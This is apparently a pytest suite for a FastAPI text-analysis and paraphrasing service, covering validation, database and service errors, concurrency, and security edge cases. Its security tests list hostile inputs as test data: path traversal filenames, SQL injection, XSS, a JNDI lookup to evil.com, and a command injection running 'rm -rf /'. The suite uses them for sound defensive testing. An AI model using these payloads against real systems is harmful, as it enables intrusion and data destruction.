"""
Error Handling and Edge Case Tests
Comprehensive testing of error conditions, edge cases, and system resilience.
"""
import io
import uuid
import json
import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy.exc import DatabaseError, IntegrityError

from app.models.document import DocumentStatus, ParaphraseMethod


class TestInputValidation:
    """Test input validation and malformed request handling."""
    
    def test_invalid_json_requests(self, client: TestClient):
        """Test handling of malformed JSON requests."""
        # Test with invalid JSON
        response = client.post(
            "/api/v2/text/analyze",
            data="{ invalid json }",
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422
        
        # Test with missing required fields
        response = client.post("/api/v2/text/analyze", json={})
        assert response.status_code == 422
        
        # Test with wrong data types
        response = client.post(
            "/api/v2/text/analyze",
            json={"text": 123, "extract_academic_terms": "not_boolean"}
        )
        assert response.status_code == 422
    
    def test_file_upload_validation(self, client: TestClient):
        """Test file upload validation and error handling."""
        # Test with no file
        response = client.post("/api/documents/upload")
        assert response.status_code == 422
        
        # Test with empty filename
        response = client.post(
            "/api/documents/upload",
            files={"file": ("", io.BytesIO(b"content"), "text/plain")}
        )
        assert response.status_code == 400
        
        # Test with extremely large file
        large_content = b"x" * (100 * 1024 * 1024)  # 100MB
        response = client.post(
            "/api/documents/upload",
            files={"file": ("large.txt", io.BytesIO(large_content), "text/plain")}
        )
        assert response.status_code == 413
        
        # Test with potentially malicious filename
        malicious_names = [
            "../../../etc/passwd",
            "con.txt",  # Windows reserved name
            "file\x00.txt",  # Null byte
            "very_long_filename_" + "x" * 300 + ".txt"
        ]
        
        for filename in malicious_names:
            response = client.post(
                "/api/documents/upload",
                files={"file": (filename, io.BytesIO(b"content"), "text/plain")}
            )
            # Should either reject or sanitize
            assert response.status_code in [200, 400, 422]
    
    def test_parameter_boundary_values(self, client: TestClient):
        """Test boundary values for numeric parameters."""
        # Test num_variants boundaries
        boundary_tests = [
            {"num_variants": 0, "expected_status": 422},  # Below minimum
            {"num_variants": 1, "expected_status": 200},  # Minimum valid
            {"num_variants": 5, "expected_status": 200},  # Maximum valid
            {"num_variants": 6, "expected_status": 422},  # Above maximum
            {"num_variants": -1, "expected_status": 422}, # Negative
            {"num_variants": 999, "expected_status": 422} # Very large
        ]
        
        for test_case in boundary_tests:
            with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
                mock_result = MagicMock()
                mock_result.paraphrased_variants = ["test"]
                mock_result.similarity_scores = [0.7]
                mock_result.quality_scores = [0.8]
                mock_result.best_variant = "test"
                mock_result.metadata = {}
                mock_paraphrase.return_value = mock_result
                
                response = client.post(
                    "/api/v2/text/paraphrase-direct",
                    json={
                        "text": "Test text",
                        "method": "indot5",
                        "num_variants": test_case["num_variants"]
                    }
                )
                
                assert response.status_code == test_case["expected_status"], \
                    f"Failed for num_variants={test_case['num_variants']}"
    
    def test_text_length_limits(self, client: TestClient):
        """Test handling of various text lengths."""
        # Test empty text
        response = client.post(
            "/api/v2/text/analyze",
            json={"text": "", "extract_academic_terms": True}
        )
        assert response.status_code == 422
        
        # Test extremely long text
        very_long_text = "x" * 1000000  # 1MB text
        
        with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
            mock_analyze.side_effect = Exception("Text too long")
            
            response = client.post(
                "/api/v2/text/analyze",
                json={"text": very_long_text, "extract_academic_terms": True}
            )
            assert response.status_code == 500
        
        # Test text with special characters
        special_text = "Test with émojis 🚀 and spëcial çharacters ñ"
        
        with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
            mock_analyze.return_value = MagicMock()
            
            response = client.post(
                "/api/v2/text/analyze",
                json={"text": special_text, "extract_academic_terms": True}
            )
            assert response.status_code == 200


class TestDatabaseErrorHandling:
    """Test database error scenarios and recovery."""
    
    def test_database_connection_failure(self, client: TestClient):
        """Test handling when database is unavailable."""
        with patch('app.core.database.get_db') as mock_get_db:
            mock_get_db.side_effect = DatabaseError("Connection failed", None, None)
            
            response = client.get("/api/documents")
            assert response.status_code == 500
    
    def test_database_constraint_violations(self, client: TestClient):
        """Test handling of database constraint violations."""
        with patch('app.services.document_processor.upload_document') as mock_upload:
            mock_upload.side_effect = IntegrityError("Duplicate key", None, None)
            
            response = client.post(
                "/api/documents/upload",
                files={"file": ("test.txt", io.BytesIO(b"content"), "text/plain")}
            )
            assert response.status_code == 500
    
    def test_transaction_rollback_scenarios(self, client: TestClient):
        """Test proper transaction rollback on errors."""
        with patch('app.services.document_processor.upload_document') as mock_upload:
            # Simulate transaction failure
            mock_upload.side_effect = Exception("Transaction failed")
            
            response = client.post(
                "/api/documents/upload",
                files={"file": ("test.txt", io.BytesIO(b"content"), "text/plain")}
            )
            assert response.status_code == 500
            
            # Verify subsequent operations still work
            response = client.get("/health")
            assert response.status_code == 200


class TestServiceErrorHandling:
    """Test error handling in service layers."""
    
    def test_nlp_service_failures(self, client: TestClient):
        """Test handling of NLP service failures."""
        # Test service unavailable
        with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
            mock_analyze.side_effect = Exception("NLP service unavailable")
            
            response = client.post(
                "/api/v2/text/analyze",
                json={"text": "Test text", "extract_academic_terms": True}
            )
            assert response.status_code == 500
            assert "NLP analysis failed" in response.json()["detail"]
        
        # Test timeout scenarios
        with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
            mock_analyze.side_effect = TimeoutError("Analysis timeout")
            
            response = client.post(
                "/api/v2/text/analyze",
                json={"text": "Test text", "extract_academic_terms": True}
            )
            assert response.status_code == 500
    
    def test_paraphrasing_service_failures(self, client: TestClient):
        """Test handling of paraphrasing service failures."""
        # Test model loading failure
        with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
            mock_paraphrase.side_effect = Exception("Model not loaded")
            
            response = client.post(
                "/api/v2/text/paraphrase-direct",
                json={"text": "Test text", "method": "indot5", "num_variants": 1}
            )
            assert response.status_code == 500
            assert "Direct paraphrasing failed" in response.json()["detail"]
        
        # Test GPU memory errors
        with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
            mock_paraphrase.side_effect = RuntimeError("CUDA out of memory")
            
            response = client.post(
                "/api/v2/text/paraphrase-direct",
                json={"text": "Test text", "method": "indot5", "num_variants": 1}
            )
            assert response.status_code == 500
        
        # Test rule-based service failure
        with patch('app.services.rule_based_paraphraser.paraphrase') as mock_rule:
            mock_rule.side_effect = Exception("Rule engine failed")
            
            response = client.post(
                "/api/v2/text/paraphrase-direct",
                json={"text": "Test text", "method": "rule_based", "num_variants": 1}
            )
            assert response.status_code == 500
    
    def test_document_processing_failures(self, client: TestClient):
        """Test document processing error scenarios."""
        # Test file reading failure
        with patch('app.services.document_processor.upload_document') as mock_upload:
            mock_upload.side_effect = IOError("Cannot read file")
            
            response = client.post(
                "/api/documents/upload",
                files={"file": ("test.txt", io.BytesIO(b"content"), "text/plain")}
            )
            assert response.status_code == 500
        
        # Test corrupted file handling
        corrupted_content = b"\x00\x01\x02\x03\x04\x05\xFF\xFE"
        
        with patch('app.services.document_processor.upload_document') as mock_upload:
            mock_upload.side_effect = ValueError("Corrupted file format")
            
            response = client.post(
                "/api/documents/upload",
                files={"file": ("corrupted.txt", io.BytesIO(corrupted_content), "text/plain")}
            )
            assert response.status_code == 400


class TestConcurrencyErrors:
    """Test error handling under concurrent conditions."""
    
    def test_concurrent_document_modification(self, client: TestClient):
        """Test handling concurrent modifications to the same document."""
        # Upload a document first
        response = client.post(
            "/api/documents/upload",
            files={"file": ("concurrent_test.txt", io.BytesIO(b"Test content"), "text/plain")}
        )
        assert response.status_code == 200
        document_id = response.json()["id"]
        
        # Simulate concurrent paraphrasing attempts
        with patch('app.services.document_processor.get_document') as mock_get_doc:
            mock_doc = MagicMock()
            mock_doc.status = DocumentStatus.PROCESSING
            mock_get_doc.return_value = mock_doc
            
            # First request should conflict
            response1 = client.post(
                f"/api/documents/{document_id}/paraphrase",
                json={"method": ParaphraseMethod.INDOT5.value}
            )
            
            # Second request should also conflict
            response2 = client.post(
                f"/api/documents/{document_id}/paraphrase",
                json={"method": ParaphraseMethod.RULE_BASED.value}
            )
            
            assert response1.status_code == 409  # Conflict
            assert response2.status_code == 409  # Conflict
    
    def test_resource_exhaustion(self, client: TestClient):
        """Test handling when system resources are exhausted."""
        import threading
        import time
        
        # Simulate multiple concurrent requests
        def make_request():
            try:
                with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
                    # Simulate slow processing
                    def slow_processing(*args, **kwargs):
                        time.sleep(0.1)
                        raise RuntimeError("Resource exhausted")
                    
                    mock_paraphrase.side_effect = slow_processing
                    
                    response = client.post(
                        "/api/v2/text/paraphrase-direct",
                        json={"text": "Test", "method": "indot5", "num_variants": 1}
                    )
                    return response.status_code
            except Exception:
                return 500
        
        # Start multiple threads
        threads = []
        results = []
        
        for _ in range(10):
            thread = threading.Thread(target=lambda: results.append(make_request()))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=5)
        
        # All should handle errors gracefully
        assert all(status in [500, 429] for status in results)  # Server error or rate limit


class TestEdgeCases:
    """Test edge cases and unusual scenarios."""
    
    def test_unicode_and_encoding_edge_cases(self, client: TestClient):
        """Test handling of various Unicode and encoding scenarios."""
        edge_case_texts = [
            "Text with emoji 🚀📚💡",
            "Mixed scripts: English, العربية, 中文, हिन्दी",
            "Special chars: \u200b\u200c\u200d\ufeff",  # Zero-width characters
            "Bidirectional text: Hello مرحبا World",
            "Mathematical symbols: ∑∫∞≠±√",
            "Currency symbols: $€£¥₹₿",
            "Combining characters: café naïve résumé",
        ]
        
        for text in edge_case_texts:
            with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
                mock_result = MagicMock()
                mock_result.sentences = [MagicMock()]
                mock_result.overall_readability = 0.7
                mock_result.overall_complexity = 0.6
                mock_result.academic_terms = set()
                mock_result.named_entities = set()
                mock_result.quality_metrics = {}
                mock_result.paraphrasing_priorities = [0]
                mock_analyze.return_value = mock_result
                
                response = client.post(
                    "/api/v2/text/analyze",
                    json={"text": text, "extract_academic_terms": True}
                )
                
                # Should handle gracefully or return appropriate error
                assert response.status_code in [200, 400, 422, 500]
    
    def test_extremely_repetitive_text(self, client: TestClient):
        """Test handling of extremely repetitive or unusual text patterns."""
        edge_texts = [
            "a" * 10000,  # Single character repeated
            "word " * 5000,  # Single word repeated
            "The quick brown fox. " * 1000,  # Sentence repeated
            "",  # Empty string
            " \n\t\r ",  # Only whitespace
            "123456789 " * 1000,  # Only numbers
            "!@#$%^&*() " * 1000,  # Only special characters
        ]
        
        for text in edge_texts:
            if not text.strip():  # Skip empty/whitespace for some endpoints
                continue
                
            with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
                mock_result = MagicMock()
                mock_result.paraphrased_variants = [text[:100] + "..."]
                mock_result.similarity_scores = [0.7]
                mock_result.quality_scores = [0.5]
                mock_result.best_variant = mock_result.paraphrased_variants[0]
                mock_result.metadata = {}
                mock_paraphrase.return_value = mock_result
                
                response = client.post(
                    "/api/v2/text/paraphrase-direct",
                    json={"text": text, "method": "indot5", "num_variants": 1}
                )
                
                # Should handle without crashing
                assert response.status_code in [200, 400, 422, 500]
    
    def test_malformed_document_ids(self, client: TestClient):
        """Test handling of malformed or invalid document IDs."""
        invalid_ids = [
            "not-a-uuid",
            "12345",
            "",
            "null",
            "undefined",
            "../../etc/passwd",
            "a" * 1000,
            str(uuid.uuid4()) + "extra",
            "00000000-0000-0000-0000-000000000000",  # Nil UUID
        ]
        
        for invalid_id in invalid_ids:
            response = client.get(f"/api/documents/{invalid_id}")
            assert response.status_code in [400, 404, 422]
            
            response = client.delete(f"/api/documents/{invalid_id}")
            assert response.status_code in [400, 404, 422]
    
    def test_concurrent_cache_operations(self, client: TestClient):
        """Test cache operations under concurrent access."""
        # Test concurrent cache clearing
        import threading
        
        def clear_cache():
            try:
                response = client.post("/api/v2/performance/clear-cache")
                return response.status_code
            except Exception:
                return 500
        
        # Start multiple cache clear operations
        threads = []
        results = []
        
        for _ in range(5):
            thread = threading.Thread(target=lambda: results.append(clear_cache()))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All operations should complete successfully
        assert all(status == 200 for status in results)
    
    def test_service_state_edge_cases(self, client: TestClient):
        """Test service behavior in unusual states."""
        # Test when services are partially loaded
        with patch('app.services.enhanced_indot5_paraphraser.model_loaded', False):
            response = client.get("/api/v2/performance/stats")
            assert response.status_code == 200
            data = response.json()
            assert data["system_status"]["models_ready"]["indot5"] is False
        
        # Test performance stats when no operations have been performed
        with patch('app.services.enhanced_indot5_paraphraser.get_performance_stats') as mock_stats:
            mock_stats.return_value = {}  # Empty stats
            
            response = client.get("/api/v2/performance/stats")
            assert response.status_code == 200
        
        # Test demo endpoint when services are unavailable
        with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze, \
             patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_indot5, \
             patch('app.services.rule_based_paraphraser.paraphrase') as mock_rule:
            
            mock_analyze.side_effect = Exception("Service unavailable")
            mock_indot5.side_effect = Exception("Model not loaded")
            mock_rule.side_effect = Exception("Rules not loaded")
            
            response = client.get("/api/v2/demo/sample-analysis")
            assert response.status_code == 500


class TestSecurityEdgeCases:
    """Test security-related edge cases and potential vulnerabilities."""
    
    def test_file_upload_security(self, client: TestClient):
        """Test file upload security measures."""
        # Test potential path traversal in filenames
        malicious_files = [
            ("../../../etc/passwd", b"malicious content"),
            ("..\\..\\windows\\system32\\config\\sam", b"malicious content"),
            ("file.txt.exe", b"executable content"),
            (".htaccess", b"apache config"),
            ("web.config", b"iis config"),
        ]
        
        for filename, content in malicious_files:
            response = client.post(
                "/api/documents/upload",
                files={"file": (filename, io.BytesIO(content), "text/plain")}
            )
            
            # Should either reject or sanitize filename
            if response.status_code == 200:
                # If accepted, verify filename was sanitized
                data = response.json()
                assert ".." not in data.get("filename", "")
                assert "\\" not in data.get("filename", "")
    
    def test_injection_attempts(self, client: TestClient):
        """Test for potential injection vulnerabilities."""
        injection_payloads = [
            "'; DROP TABLE documents; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "../../../etc/passwd",
            "\"; os.system('rm -rf /'); \"",
        ]
        
        for payload in injection_payloads:
            # Test in text analysis
            with patch('app.services.indonesian_nlp_pipeline.analyze_document') as mock_analyze:
                mock_analyze.return_value = MagicMock()
                
                response = client.post(
                    "/api/v2/text/analyze",
                    json={"text": payload, "extract_academic_terms": True}
                )
                
                # Should handle without executing malicious code
                assert response.status_code in [200, 400, 422, 500]
            
            # Test in paraphrasing
            with patch('app.services.enhanced_indot5_paraphraser.paraphrase_single') as mock_paraphrase:
                mock_paraphrase.return_value = MagicMock()
                
                response = client.post(
                    "/api/v2/text/paraphrase-direct",
                    json={"text": payload, "method": "indot5", "num_variants": 1}
                )
                
                assert response.status_code in [200, 400, 422, 500]
    
    def test_resource_exhaustion_protection(self, client: TestClient):
        """Test protection against resource exhaustion attacks."""
        # Test with extremely large number requests
        large_request = {
            "text": "test",
            "method": "indot5",
            "num_variants": 999999999  # Extremely large number
        }
        
        response = client.post("/api/v2/text/paraphrase-direct", json=large_request)
        assert response.status_code == 422  # Should be rejected by validation
        
        # Test with extremely large quality threshold
        large_threshold_request = {
            "document_id": str(uuid.uuid4()),
            "method": ParaphraseMethod.INDOT5.value,
            "quality_threshold": 999999.999
        }
        
        response = client.post(
            f"/api/v2/documents/{large_threshold_request['document_id']}/paraphrase-enhanced",
            json=large_threshold_request
        )
        assert response.status_code in [400, 404, 422]  # Should be rejected or not found
